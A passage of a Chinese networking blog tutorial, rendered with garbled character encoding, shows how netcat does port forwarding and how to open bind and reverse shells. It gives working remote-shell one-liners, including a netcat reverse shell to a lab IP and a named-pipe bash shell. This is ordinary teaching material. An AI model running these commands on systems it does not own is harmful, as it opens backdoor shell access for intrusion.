---
title: TCP/IP ç‘å£«å†›åˆ€ - netcat (ç¯‡äºŒ)
date: 2020-12-11 19:19:36
tags: [TCP/IP, netcat]
thumbnail: https://image.blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-1/banner.jpg
---

[æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘](https://blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-2.html)

## å‰è¨€
æ˜¨æ—¥å†™ [TCP/IP ç‘å£«å†›åˆ€ - netcat (ç¯‡ä¸€)](https://blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-1.html) çš„æ—¶å€™ï¼Œç¿»é˜…äº†å¤§é‡çš„èµ„æ–™ï¼Œæµè§ˆå™¨çš„æ ‡ç­¾ä¹Ÿéƒ½å¼€æ»¡äº†ã€‚æ‰€ä»¥è¶å¤§è„‘è¿˜ä¾æ—§æ´»è·ƒï¼Œä»Šå¤©ä¹˜èƒœè¿½å‡»å†™ä¸ª `ç¯‡äºŒ`ï¼Œä»ç„¶æ˜¯ä»¥ GIF åŠ¨å›¾æ¼”ç¤ºå…¶æ¡ˆä¾‹ã€‚

## è¡¥ä¸Šç¯‡
ä¸Šç¯‡é‡Œæœ‰æåˆ°ï¼Œå¦‚æœåªç”¨ `netcat` è¿›è¡Œç«¯å£è½¬å‘ï¼Œå¿…é¡»ç”¨åˆ° `GNU` ç‰ˆæœ¬ï¼ˆå› å…¶æ‹¥æœ‰ `-c / -e` å‚æ•°ï¼‰ï¼š

- `-c shell commands` è°ƒç”¨ /bin/sh æ¥æ‰§è¡Œå‘½ä»¤
- `-e filename` é€šè¿‡ç¨‹åºæ–‡ä»¶è·¯å¾„æ¥æ‰§è¡Œç¨‹åº

ä¸Šæ¡ˆä¾‹ï¼š

- è¿œç«¯æ‰§è¡Œ `nc -l -k -p 8080 -c "nc 192.168.1.21 22"`ï¼Œå³å¯å°† `8080` ç«¯å£è½¬å‘åˆ° `192.168.1.21:22`
- æœ¬åœ°æ‰§è¡Œ `ssh 10.144.137.114 -p 8080` å³å¯æµ‹è¯•è½¬å‘æˆåŠŸ

![GNU-netcat ç«¯å£è½¬å‘](https://image.blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-2/netcat-gnu-port-forwarding.gif)

## åå¼¹ Shell
`netcat` åœ¨ç½‘ç»œåº”ç”¨ä¸­ï¼Œå¾ˆå—é»‘å®¢çš„å–œçˆ±ï¼Œ`åå¼¹ Shell` æ˜¯å…¶ç»å¸¸ä½¿ç”¨çš„åœºæ™¯ã€‚

ä»€ä¹ˆæ˜¯ `åå¼¹ Shell` å‘¢ï¼Ÿç»™ä¸ªä¸€å¥è¯è§£é‡Šï¼šåœ¨ç›®æ ‡æœºå™¨ä¸Šï¼Œå¼¹ä¸€ä¸ª Shell å‡ºæ¥ä½œä¸ºå…¶åé—¨ï¼Œä¸æœ¬åœ°æœºå™¨è¿›è¡Œé€šä¿¡ï¼Œå³ **æœ¬åœ°æœºå™¨** å¯ç›´æ¥è®¿é—® **ç›®æ ‡æœºå™¨** çš„ Shellã€‚

è€Œ `åå¼¹ Shell` ä¹Ÿåˆ†ä¸ºä¸¤ç§ï¼š

- `æ­£å‘ Shell`ï¼Œåˆå `bind shell`
- `åå‘ Shell`ï¼Œåˆå `reverse shell`

å› ä¸ºè¦å¼¹ä¸ª Shell å‡ºæ¥ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½éœ€è¦è®¿é—®åˆ° Shellï¼Œ`/bin/sh` æˆ–  `/bin/bash` æˆ– `/bin/zsh` éƒ½å¯ä»¥ã€‚æ—¢ç„¶ç”¨åˆ°å¤–éƒ¨ Shell ç¨‹åºï¼Œé‚£ä¸€èˆ¬éƒ½æ˜¯ä½¿ç”¨ `GNU` ç‰ˆæœ¬çš„ `netcat`ï¼ˆç”¨åˆ°å…¶ `-c / -e` å‚æ•°ï¼‰

### æ­£å‘ Shell
å…ˆå¼¹åè¿æ¥ï¼Œå³è®© `ç›®æ ‡æœºå™¨` å…ˆå¼¹ä¸ª Shellï¼Œæš´éœ²åœ¨æŸç«¯å£ï¼Œç„¶å `æœ¬åœ°æœºå™¨` è¿æ¥ä¸Š `ç›®æ ‡æœºå™¨` è¯¥ç«¯å£ï¼Œå³å¯è®¿é—®ç›®æ ‡æœºå™¨çš„ Shellã€‚

- ç›®æ ‡æœºå™¨ï¼š`nc -l -p 8080 -e /bin/bash`
- æœ¬åœ°æœºå™¨ï¼š`nc 10.144.137.114 8080`

![GNU netcat å¼¹æ­£å‘ Shell](https://image.blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-2/netcat-gnu-bind-shell.gif)

### åå‘ Shell
å…ˆç›‘å¬åè¿æ¥ï¼Œå³ `æœ¬åœ°æœºå™¨` å…ˆç›‘å¬ `ç›®æ ‡æœºå™¨` çš„æŸç«¯å£ï¼Œå¦‚æœ `ç›®æ ‡æœºå™¨` åœ¨è¯¥ç«¯å£å¼¹å‡ºäº† Shellï¼Œå°±å¯ç«‹å³è¿æ¥ä¸Šã€‚

- æœ¬åœ°æœºå™¨ï¼š`nc -v -l -p 8080`
- ç›®æ ‡æœºå™¨ï¼š`nc 10.144.247.172 8080 -e /bin/bash`

![GNU netcat å¼¹åå‘ Shell](https://image.blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-2/netcat-gnu-reverse-shell-2.gif)


### OpenBSD netcat å®ç°æ­£å‘ Shell
é‚£å¦‚æœéè¦ç”¨ `OpenBSD` ç‰ˆæœ¬çš„ `netcat`ï¼Œæ­é…ä»€ä¹ˆä½¿ç”¨å¯ä»¥åå¼¹ Shell å‘¢ï¼Ÿè¿™é‡Œç¬”è€…åˆ—ä¸¾ä¸€ä¸ªåˆ—å­ - `å‘½åç®¡é“ï¼ˆnamed pipeï¼‰`ï¼Œåˆå `FIFO`ï¼Œå³ `first in first out` å…ˆè¿›å…ˆå‡ºã€‚

- ç›®æ ‡æœºå™¨å…ˆæ‰§è¡Œï¼š`mkfifo /tmp/pipe` åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“
- ç›®æ ‡æœºå™¨å†æ‰§è¡Œï¼š`cat /tmp/pipe | /bin/bash 2>&1 | nc -l -p 8080 > /tmp/pipe` è¿›è¡Œåå¼¹ Shell
- æœ¬åœ°æœºå™¨æ‰§è¡Œï¼š`nc 192.168.1.21 8080`

> `å‘½åç®¡é“` çš„ `stdoutï¼ˆæ ‡å‡†è¾“å‡ºï¼‰` é€šè¿‡ `"|"` æµå‘ `bash`
> 
> `2>&1` è¡¨ç¤º bash çš„ `stderrï¼ˆæ ‡å‡†é”™è¯¯ï¼‰` é‡å®šå‘åˆ° `stdoutï¼ˆæ ‡å‡†è¾“å‡ºï¼‰`
> 
> `bash` çš„ `stdoutï¼ˆæ ‡å‡†è¾“å‡ºï¼‰` é€šè¿‡ `"|"` æµå‘ `ç›®æ ‡æœºå™¨çš„ nc`
>
> è¿›è€Œé€šè¿‡ `TCP/UDP è¿æ¥` æµå‘ `æœ¬åœ°æœºå™¨çš„ nc` å¹¶æ˜¾ç¤º
>
> `æœ¬åœ°æœºå™¨` è¾“å…¥çš„å‘½ä»¤å†é€šè¿‡ `æœ¬åœ°æœºå™¨çš„ nc` æµå‘ `ç›®æ ‡æœºå™¨çš„ nc`
>
> `ç›®æ ‡æœºå™¨çš„ nc` å°†æ¥æ”¶åˆ°çš„å‘½ä»¤è¾“å…¥ `å‘½åç®¡é“`
> 
> è‡³æ­¤å½¢æˆä¸€ä¸ªå®Œæ•´çš„å¾ªç¯

![OpenBSD netcat å¼¹æ­£å‘ Shell](https://image.blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-2/netcat-openbsd-bind-shell-with-fifo.gif)

## å†™åœ¨æœ€å
æœ¬æ–‡æ¼”ç¤ºäº†ç”¨ `netcat` å®ç° `ç«¯å£è½¬å‘` å’Œ `åå¼¹ Shell`ï¼Œè¿˜æœ‰å¾ˆå¤šæ¡ˆä¾‹ï¼Œç­‰å¾…è¯»è€…ä»¬å»å‘æ˜ï¼

---

æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š
![](https://image.blog.chaosjohn.com/donate-me.png)